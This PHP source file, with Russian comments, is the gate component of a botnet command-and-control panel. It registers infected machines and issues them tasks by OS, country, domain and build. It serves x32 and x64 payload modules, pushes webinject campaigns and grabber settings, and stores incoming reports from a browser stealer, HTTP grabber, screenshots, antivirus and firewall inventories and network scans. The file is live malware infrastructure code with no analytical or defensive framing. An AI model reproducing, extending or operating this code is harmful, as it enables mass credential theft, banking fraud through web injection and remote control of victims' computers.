<?php

require_once 'application/modules/protobuf/protocol/ProtobufProtocolWorker.php';

class Model_Gate extends Model {

    public function get_data() {

    }

    /**
     * @return 0 or 1 (not work or work)
     */
    public function getGateStatus()
    {
        $gate_status = $this->getDB()->queryValue("SELECT setting_value FROM general_settings WHERE setting_name='gate_status'");
        return $gate_status;
    }

    // bot_id - exist, false - not exist

    /**
     * @return number|bool Bot id or false
     */
    public function isBotExist()
    {
        $bot_exist = $this->getDB()->queryRow('SELECT id FROM bots WHERE botid=:botid', array(':botid' => $this->request_data['botid']));
        if (!empty($bot_exist))
        {
            return $bot_exist['id'];
        }
        return false;
    }

    private function botidIsCorrect()
    {
        if (preg_match("#^[aA-zZ0-9\-_]+$#", $this->request_data['botid']))
            return true;
        else
            return false;
    }

    private function botInfoIsCorrect()
    {
        if (!empty($this->request_data['build']) && !empty($this->request_data['cpu']) &&
            !empty($this->request_data['os']) && !empty($this->request_data['display_width']) && !empty($this->request_data['architecture']))
            return true;
        else
            return false;
    }

    public function taskStatusInfoIsCorrect()
    {
        if (!empty($this->request_data['task_id']) && (!empty($this->request_data['status']) || $this->request_data['status'] == 0) &&
            is_numeric($this->request_data['task_id']) && in_array($this->request_data['status'], array(0,1)))
            return true;
        else
            return false;
    }

    public function regBot()
    {
        try {
            if ($this->botidIsCorrect() && $this->botInfoIsCorrect())
            {
                $bot = new Bot($this->request_data['botid'], $this->request_data['os'], $this->request_data['build'],
                    $this->request_data['cpu'], $this->request_data['display_width'], $this->request_data['computer_name'], $this->request_data['architecture'], $this->getDB());
                $newBotID = $this->getDB()->insert('bots', (array)$bot);
                $bot = null;
                return $newBotID;
            }
        }
        catch(Exception $e)
        {
            Logger::Error('GateModel', 'regBot (exception)', $e, null, json_encode($this->request_data));
        }
        return 0;
    }

    public function updateBot($bot_id)
    {
        $response = '';
        try {
            if ($this->botidIsCorrect()) {
                $bot = $this->getDB()->queryRow('SELECT * FROM bots WHERE id=:id', array(':id' => $bot_id));
                if ($this->botInfoIsCorrect())
                {
                    $new_bot = new Bot($this->request_data['botid'], $this->request_data['os'], $this->request_data['build'],
                        $this->request_data['cpu'], $this->request_data['display_width'], $this->request_data['computer_name'], $this->request_data['architecture'], $this->getDB());
                    $updated_bot = $new_bot->updateBotInfo($bot);
                    if (!empty($updated_bot)) {
                        $this->getDB()->update('bots', $updated_bot, 'id=:id', array(':id' => $bot_id));
                        $response = 'updated';
                    }
                }
            }
        }
        catch(Exception $e)
        {
            Logger::Error('GateModel', 'updateBot (exception)', $e, null, json_encode($this->request_data));
        }
        return $response;
    }

    /**
     * Метод отстука: обновляет статус бота и выдает ему актуальную информацию
     * @return mixed сериализованные данные (таски, модули, настройки)
     */
    public function knockBot()
    {
        $bot = $this->getDB()->queryRow('SELECT * FROM bots WHERE botid=:botid', array(':botid' => $this->request_data['botid']));
        $this->updateBotOnKnock($bot);
        // тут сериализация настроек бота (таски, сеттинги, модули)
        $pbWorker = new ProtobufProtocolWorker();

        $tasks = $this->collectTasks($bot);
        $modules = $this->collectModules($bot);
        $knockTimeout = $this->getDB()->queryValue('SELECT setting_value FROM general_settings WHERE setting_name=:setting_name', array(':setting_name' => 'knock_timeout'));
        $grabberSettings = $this->getGrabberSettings();
        $injects = $this->combineInjects($bot);
        return $pbWorker->generateData($bot['botid'], 0, false, $knockTimeout, $modules, $tasks, $injects, $grabberSettings);
    }

    /**
     * Метод возвращает коллекцию тасков, для выполнения которых подходит конкретный бот
     * @param $bot array данные о боте, взятые из таблицы
     * @return array
     */
    private function collectTasks($bot)
    {
        Logger::Trace('Model_Gate', 'collectTasks', '[Start]');
        $collectedTasks = array();
        $tasks = $this->getDB()->queryRows(
            'SELECT * FROM main_tasks WHERE (os LIKE ? OR os=0) AND (country LIKE ? OR country=0) AND (bot_ids LIKE ? OR bot_ids = "" OR bot_ids = NULL) AND status = ' . TaskStatus::Active,
            array('%'.$bot['os'].'%', '%'.$bot['country'].'%', '%'.$bot['botid'].'%'));
        if (count($tasks))
        {
            foreach ($tasks as $task)
            {
                // additional checks here
                if (!$this->domainIsCorrect($task['domain_names'], $bot))
                {
                    continue;
                }

                if (!$this->flowIsCorrect($task['flows'], $bot))
                {
                    continue;
                }

                // если еще недостаточное количество ботов получило таски или количество ботов - бесконечное
                if ($task['bots_with_task'] < $task['bots'] || $task['bots'] == 0)
                {
                    $isBotLogExist = $this->getDB()->queryValue('SELECT COUNT(*) FROM taskslog WHERE task_id = :task_id AND bot_id = :bot_id',
                        array(':task_id' => $task['id'], ':bot_id' => $bot['id']));

                    if (!$isBotLogExist)
                    {
                        $cores = 0;

                        if ($task['cpu'] != 0)
                        {
                            $cores = explode(';', $task['cpu']);
                        }

                        if ($cores == 0 || in_array($bot['cpu'], range($cores[0], $cores[1])))
                        {
                            $bot_log = new BotLog($task['id'], $bot['id'], BotLogStatus::TaskIssued);
                            $this->getDB()->insert('taskslog', (array)$bot_log);
                            $test = $this->getDB()->update('main_tasks', array('bots_with_task' => $task['bots_with_task'] + 1),
                                'id = :id', array(':id' => $task['id']));
                            $collectedTasks[] = array('id' => $task['id'], 'sid' => $task['sid'], 'command' => $task['method_type'], 'context' => $task['context']);
                        }
                    }
                    else
                    {
                        $logForBot = $this->getDB()->queryRow('SELECT * FROM taskslog WHERE task_id = :task_id AND bot_id = :bot_id',
                            array(':task_id' => $task['id'], ':bot_id' => $bot['id']));
                        if (!$logForBot['is_completed']) {
                            $collectedTasks[] = array('id' => $task['id'], 'sid' => $task['sid'], 'command' => $task['method_type'], 'context' => $task['context']);
                        }
                    }
                }
                // если нужное количество ботов забрали таски, мы продолжаем чекать только тех, кто уже взял таск
                else
                {
                    // если нужное количество ботов получили свои таски, мы проверяем, все ли из них завершили выполнение
                    if (!$this->isCompletedTask($task))
                    {
                        $logForBot = $this->getDB()->queryRow('SELECT * FROM taskslog WHERE task_id = :task_id AND bot_id = :bot_id',
                            array(':task_id' => $task['id'], ':bot_id' => $bot['id']));
                        if (!$logForBot['is_completed']) {
                            $collectedTasks[] =  array('id' => $task['id'], 'sid' => $task['sid'], 'command' => $task['method_type'], 'context' => $task['context']);
                        }
                    }
                    else
                    {
                        $this->getDB()->update('main_tasks', array('status' => TaskStatus::Completed),
                            'id = :id', array(':id' => $task['id']));
                        break;
                    }
                }
            }
        }
        Logger::Trace('Model_Gate', 'collectTasks', ('[End] Tasks count: ' . count($collectedTasks)) );
        return $collectedTasks;
    }

    private function domainIsCorrect($domainNames, $bot)
    {
        if (!empty($domainNames))
        {
            $domainNamesList = explode(',', $domainNames);
            $domainName = $this->getDB()->queryValue('SELECT domain_name FROM reports_netview_info WHERE bot_id=:bot_id', array(':bot_id' => $bot['id']));
            if (!empty($domainName))
            {
                foreach($domainNamesList as $dName)
                {
                    if (trim($dName) == $domainName)
                    {
                        return true;
                    }
                }
            }
            return false;
        }
        return true;
    }

    private function flowIsCorrect($flows, $bot)
    {
        if (!empty($flows))
        {
            $flowsList = explode(',', $flows);
            if (!empty($bot['build_version']))
            {
                foreach($flowsList as $flow)
                {
                    if (trim($flow) == $bot['build_version'])
                    {
                        return true;
                    }
                }
            }
            return false;
        }
        return true;
    }

    /**
     * Update bot status
     * @param $bot
     */
    private function updateBotOnKnock($bot)
    {
        Logger::Trace('Model_Gate', 'updateBotOnKnock', '[Start]');
        $layerIp = !empty($_SERVER['HTTP_LAYER_IP']) ? $_SERVER['HTTP_LAYER_IP'] : NULL;
        if ($layerIp != NULL)
        {
            if (!LayerData::isExist($this->getDB(), $layerIp)) {
                LayerData::save($this->getDB(), $layerIp);
            }
        }
        $botIp = Bot::getUserIP();
        $this->getDB()->update('bots', array('ip' => $botIp, 'layer_ip' => $layerIp, 'last_login' => time()), 'id=:id', array(':id' => $bot['id']));
        Logger::Trace('Model_Gate', 'updateBotOnKnock', '[End]');
    }

    private function isCompletedTask($task)
    {
        $completedBotsCount = $this->getDB()->queryValue('SELECT COUNT(*) FROM taskslog WHERE task_id = :task_id AND is_completed = 1',
            array(':task_id' => $task['id']));
        if ($completedBotsCount < $task['bots']) {
            return false;
        }
        return true;
    }

    /**
     * Метод возвращает коллекцию активных модулей, которые подходят под разрядность бота
     * @param $bot array данные о боте, взятые из таблицы
     * @return array
     */
    private function collectModules($bot)
    {
        Logger::Trace('Model_Gate', 'collectModules', '[Start]');
        $collectedModules = array();
        $modules = $this->getDB()->queryRows('SELECT * FROM modules');
        if (count($modules))
        {
            foreach ($modules as $module)
            {
                if ((int)$module['status'] === ModuleStatus::NotActive)
                {
                    continue;
                }

                if ((int)$module['status'] === ModuleStatus::ConstantlyActive || $this->isTasksExistForModule($module['id']))
                {
                    $collectedModules[] = array(
                        'id' => $module['id'],
                        'hash_x32' => $module['hash_x32'],
                        'hash_x64' => $module['hash_x64'],
                        'constantly_active' => (int)$module['status'] === ModuleStatus::ConstantlyActive);
                }
            }
        }
        Logger::Trace('Model_Gate', 'collectModules', ('[End] Modules count: ' . count($modules)) );
        return $collectedModules;
    }

    /**
     * Метод поиска активных тасков для модуля, если активные таски существуют, возвращаем успех
     * @param $module_id
     * @return bool
     */
    private function isTasksExistForModule($module_id)
    {
        $tasks = $this->getDB()->queryValue('SELECT COUNT(*) FROM main_tasks WHERE sid=:module_id AND status=:status',
            array(':module_id' => $module_id, ':status' => TaskStatus::Active));
        if ($tasks)
        {
            return true;
        }
        return false;
    }

    /**
     * Метод возвращает скомбинированные уникальные инжекты из всех актуальных кампаний
     * @param $bot array Bot's data
     * @return string combined string with all injects found
     */
    private function combineInjects($bot)
    {
        Logger::Trace('Model_Gate', 'combineInjects', '[Start]');
        $combinedInjects = '';

        $campaigns = $this->getDB()->queryRows('SELECT * FROM webinjects_campaigns WHERE (botids LIKE :botids_pattern OR botids=0) AND (countries LIKE :countries_pattern OR countries=0)',
            array(':botids_pattern' => '%'.$bot['botid'].'%', ':countries_pattern' => '%'.$bot['country'].'%'));
        $sorted_campaigns = $this->sortInjectsCampaigns($campaigns);

        $injects = array();

        foreach ($sorted_campaigns as $campaign)
        {
            if ((int)$campaign['group_id'] > 0)
            {
                $injectsFromGroup = $this->getDB()->queryValues('SELECT inject_id FROM webinjects_groups_injects WHERE group_id=:group_id',
                    array(':group_id' => $campaign['group_id']));
                foreach($injectsFromGroup as $injectFromGroup)
                {
                    $injects[] = $injectFromGroup;
                }
            }
            else
            {
                $injectsFromCampaign = $this->getDB()->queryValues('SELECT inject_id FROM webinjects_campaigns_injects WHERE campaign_id=:campaign_id',
                    array(':campaign_id' => $campaign['id']));
                foreach($injectsFromCampaign as $injectFromCampaign)
                {
                    $injects[] = $injectFromCampaign;
                }
            }
        }

        $sortedInjects = array_unique($injects, SORT_NUMERIC);

        if (!empty($sortedInjects))
        {
            foreach ($sortedInjects as $inject)
            {
                $combinedInjects .= $this->getDB()->queryValue('SELECT source FROM webinjects_injects WHERE id=:id', array(':id' => $inject)) . "\n";
            }
        }

        Logger::Trace('Model_Gate', 'combineInjects', '[End]');
        return $combinedInjects;
    }

    private function sortInjectsCampaigns($campaigns)
    {
        $existedGroupIds = array();
        $sortedCampaigns = array();
        foreach($campaigns as $campaign)
        {
            if ((int)$campaign['group_id'] > 0 && !in_array($campaign['group_id'], $existedGroupIds, false))
            {
                $existedGroupIds[] = $campaign['group_id'];
                $sortedCampaigns[] = $campaign;
            }
            else if ($campaign['group_id'] == 0)
            {
                $sortedCampaigns[] = $campaign;
            }
        }
        return $sortedCampaigns;
    }

    private function getGrabberSettings()
    {
        $grabberSettings = $this->getDB()->queryValue('SELECT config FROM http_grabber_settings');
        return $grabberSettings;
    }

    /**
     * Метод для получения обновленной версии модуля необходимой разрядности
     * @return string сериализованный контекст модуля
     */
    public function getModuleContext()
    {
        Logger::Trace('Model_Gate', 'getModuleContext', '[Start]');
        $generatedPacket = '';
        $pbWorker = new ProtobufProtocolWorker();
        $moduleInfoData = new ModuleInfoData();

        $bot = $this->getDB()->queryRow('SELECT * FROM bots WHERE botid=:botid', array(':botid' => $this->request_data['botid']));
        $module = $this->getDB()->queryRow('SELECT * FROM modules WHERE id=:id', array(':id' => $this->request_data['id']));

        if (file_exists(MODULES_DIRECTORY . $module['path_x32']))
        {
            $moduleInfoData->fileContentX32 = file_get_contents(MODULES_DIRECTORY . $module['path_x32']);
            $moduleInfoData->fileContentX32Length = filesize(MODULES_DIRECTORY . $module['path_x32']);
        }

        if ((int)$bot['architecture'] === 64 && file_exists(MODULES_DIRECTORY . $module['path_x64']))
        {
            $moduleInfoData->fileContentX64 = file_get_contents(MODULES_DIRECTORY . $module['path_x64']);
            $moduleInfoData->fileContentX64Length = filesize(MODULES_DIRECTORY . $module['path_x64']);
        }

        $generatedPacket = $pbWorker->generateModuleContext($bot['botid'],
            $moduleInfoData->fileContentX64, $moduleInfoData->fileContentX64Length,
            $moduleInfoData->fileContentX32, $moduleInfoData->fileContentX32Length);

        unset($moduleInfoData);
        unset($pbWorker);

        Logger::Trace('Model_Gate', 'getModuleContext', '[End]');

        return $generatedPacket;
    }

    /**
     * Метод обновляет информацию о процессе выполнения таска конкретным ботом
     * @return int id обновленного лога или 0 (не влияет ни на что, по сути)
     */
    public function updateStatusForBot()
    {
        $result = 0;

        if ($this->botidIsCorrect() && $this->taskStatusInfoIsCorrect())
        {
            $oldStatus = $this->getDB()->queryValue('SELECT status FROM taskslog WHERE bot_id=:bot_id AND task_id = :task_id',
                array(':bot_id' => $this->getRowIdByBotId($this->request_data['botid']), ':task_id' => $this->request_data['task_id']));

            $fieldsForUpdate = array();

            if ($this->request_data['is_completed'])
            {
                $fieldsForUpdate['is_completed'] = 1;
            }

            if ($oldStatus != BotLogStatus::TaskSuccessfullyCompleted)
            {
                $fieldsForUpdate['status'] = $this->request_data['status'];
            }

            if (!empty($fieldsForUpdate)) {
                $result = $this->getDB()->update('taskslog', $fieldsForUpdate,
                    'bot_id=:bot_id AND task_id = :task_id',
                    array(':bot_id' => $this->getRowIdByBotId($this->request_data['botid']), ':task_id' => $this->request_data['task_id']));
            }
        }
        else
        {
            Logger::Trace('Model_Gate', 'updateStatusForBot', 'botidIsCorrect = false or taskStatusInfoIsCorrect = false');
        }
        return $result;
    }

    public function writeReports()
    {
        Logger::Trace('Model_Gate', 'writeReports', '[Start]');

        $bRetVal = true;
        foreach($this->request_data as $report)
        {
            Logger::Trace('Model_Gate', 'writeReports', ('Recording report: ' . $report['reportType']) );

            $success = true;
            switch($report['reportType'])
            {
                case PacketReportTypes::BrowserGrabber:
                    require_once 'application/services/ReportsHandlers/ReportBrowserStealerHandler.php';
                    $bdsHandle = new ReportBrowserStealerHandler();
                    $bdsHandle->grabDataFromJson($report['report'], $report['botid']);
                    $success = $bdsHandle->storeDataToServer();
                    break;

                case PacketReportTypes::HttpGrabber:
                    require_once 'application/services/ReportsHandlers/ReportHttpGrabberHandler.php';
                    $reportSoftwareHandler = new ReportHttpGrabberHandler();
                    $reportSoftwareHandler->grabDataFromProtobuf($report['report'], $report['botid']);
                    $success = $reportSoftwareHandler->storeDataToServer();
                    break;

                case PacketReportTypes::Software:
                    require_once 'application/services/ReportsHandlers/ReportSoftwareHandler.php';
                    $reportSoftwareHandler = new ReportSoftwareHandler();
                    $reportSoftwareHandler->grabDataFromProtobuf($report['report'], $report['botid']);
                    $success = $reportSoftwareHandler->storeDataToServer();
                    break;

                case PacketReportTypes::Antiviruses:
                    require_once 'application/services/ReportsHandlers/ReportAntivirusesHandler.php';
                    $reportAntivirusesHandle = new ReportAntivirusesHandler();
                    $reportAntivirusesHandle->grabDataFromProtobuf($report['report'], $report['botid']);
                    $success = $reportAntivirusesHandle->storeDataToServer();
                    break;

                case PacketReportTypes::Firewalls:
                    require_once 'application/services/ReportsHandlers/ReportFirewallsHandler.php';
                    $reportFirewallsHandle = new ReportFirewallsHandler();
                    $reportFirewallsHandle->grabDataFromProtobuf($report['report'], $report['botid']);
                    $success = $reportFirewallsHandle->storeDataToServer();
                    break;

                case PacketReportTypes::ScreenShot:
                    require_once 'application/services/ReportsHandlers/ReportScreenshotHandler.php';
                    $reportScreenShotHandler = new ReportScreenshotHandler();
                    $reportScreenShotHandler->grabDataFromProtobuf($report['report'], $report['botid']);
                    $success = $reportScreenShotHandler->storeDataToServer();
                    break;
                case PacketReportTypes::NetView:
                    require_once 'application/services/ReportsHandlers/ReportNetViewHandler.php';
                    $reportNetViewHandler = new ReportNetViewHandler();
                    $reportNetViewHandler->grabDataFromProtobuf($report['report'], $report['botid']);
                    $success = $reportNetViewHandler->storeDataToServer();
                    break;
            }

            Logger::Trace('Model_Gate', 'writeReports', ('Report recorded: ' . $report['reportType']) );

            if (!$success)
            {
                $bRetVal = false;
            }
        }

        Logger::Trace('Model_Gate', 'writeReports', ('[End] Success: ' . $bRetVal));

        return $bRetVal;
    }

    public function convertDataToUnderstandingView()
    {
        $new_data = array();
        $new_data['botid'] = $this->request_data['uid'];
        $new_data['os'] = $this->request_data['osVersion'];
        $new_data['display_width'] = $this->request_data['display_resolution'];
        $new_data['computer_name'] = $this->request_data['computerName'];
        $new_data['build'] = $this->request_data['version'];
        $new_data['cpu'] = $this->request_data['cores'];
        $new_data['architecture'] = $this->request_data['architecture'];
        $this->request_data = null;
        $this->setRequestData($new_data);
    }

}

/*
 * Models
 * TODO: need to move the code below to another file
 */

class Bot {
    public $botid;
    public $os;
    public $ip;
    public $cpu;
    public $build_version;
    public $country;
    public $first_login;
    public $last_login;
    public $display_width;
    public $computer_name;
    public $architecture;
    public $layer_ip;

    function __construct($botid,$os,$build,$cpu,$display_width,$computer_name,$architecture,$db)
    {
        $GeoIP2 = new IP2Location('application/modules/geo2/IP2LOCATION-LITE-DB1.BIN', IP2Location::FILE_IO);
        $this->botid = $botid;
        $this->os = $os;
        $this->ip = Bot::getUserIP();
        $this->cpu = $cpu;
        $this->build_version = $build;
        $this->country = $GeoIP2->lookup(Bot::getUserIP(), IP2Location::COUNTRY_CODE);
		if (!is_string($this->country))
        {
            $this->country = null;
        }
        $this->first_login = time();
        $this->last_login = time();
        $this->display_width = $display_width;
        $this->computer_name = $computer_name;
        $this->architecture = $architecture;
        if (!empty($_SERVER['HTTP_LAYER_IP'])) {

            $this->layer_ip = $_SERVER['HTTP_LAYER_IP'];

            if (!LayerData::isExist($db, $this->layer_ip)) {
                LayerData::save($db, $this->layer_ip);
            }
        } else {
            $this->layer_ip = NULL;
        }
        $GeoIP2 = null;
    }

    function updateBotInfo($old_bot = array())
    {
        if (is_array($old_bot)) {
            $new_bot = (array)$this;
            $fields = array_keys($new_bot);
            foreach ($fields as $field) {
                if ($old_bot[$field] != $new_bot[$field] && $field != 'first_login' && $field != 'botid') {
                    $old_bot[$field] = $new_bot[$field];
                }
            }
            return $old_bot;
        }
        return NULL;
    }

    public static function getUserIP()
    {
        $ipaddress = '';
        if (isset($_SERVER['HTTP_USER_IP']))
            $ipaddress = $_SERVER['HTTP_USER_IP'];
        else if (isset($_SERVER['HTTP_CLIENT_IP']))
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
        else if(isset($_SERVER['HTTP_X_FORWARDED']))
            $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
        else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
            $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
        else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
            $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
        else if(isset($_SERVER['HTTP_FORWARDED']))
            $ipaddress = $_SERVER['HTTP_FORWARDED'];
        else if(isset($_SERVER['REMOTE_ADDR']))
            $ipaddress = $_SERVER['REMOTE_ADDR'];
        else
            $ipaddress = 'UNKNOWN';
        return $ipaddress;
    }
}

class BotLog
{
    public $task_id;
    public $bot_id;
    public $status;

    function __construct($task_id, $botid, $status) {
        $this->bot_id = $botid;
        $this->status = $status;
        $this->task_id = $task_id;
    }
}

class ReportLog
{
    public $botid;
    public $report;

    function __construct($botid, $report)
    {
        $this->botid = $botid;
        $this->report = $report;
    }
}

abstract class BotLogStatus
{
    const TaskSuccessfullyCompleted = 1;
    const TaskCompletedWithError = 0;
    const TaskIssued = 2;
}

class ModuleInfoData
{
    public $fileContentX32;
    public $fileContentX32Length;
    public $fileContentX64;
    public $fileContentX64Length;

    public function __construct()
    {
        $this->fileContentX32 = null;
        $this->fileContentX32Length = null;
        $this->fileContentX64 = null;
        $this->fileContentX64Length = null;
    }
}

class LayerData
{
    public static function isExist($db, $ip)
    {
        return $db->queryValue('SELECT COUNT(id) FROM layers WHERE ip=:ip', array(':ip' => $ip));
    }

    public static function save($db, $ip)
    {
        $db->insert('layers', array('ip' => $ip));
    }
}